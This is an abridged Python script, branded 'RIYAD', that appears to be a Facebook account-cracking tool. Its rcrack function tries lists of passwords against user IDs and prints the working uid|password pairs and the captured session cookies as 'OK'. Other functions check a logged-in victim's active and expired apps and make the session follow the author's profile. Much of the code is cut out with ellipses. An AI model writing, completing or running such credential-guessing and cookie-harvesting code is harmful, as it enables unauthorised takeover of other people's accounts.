...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/Itz.magibazRiad.khulekheledibo')
        FD()
        return None
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[RIYAD] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[RIYAD] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/Itz.magibazRiad.khulekheledibo', {
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(RIYAD-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(RIYAD-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
        ...
        loop+=1
        print (uid)
        sys.stdout.write('\r     %s[RIYAD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
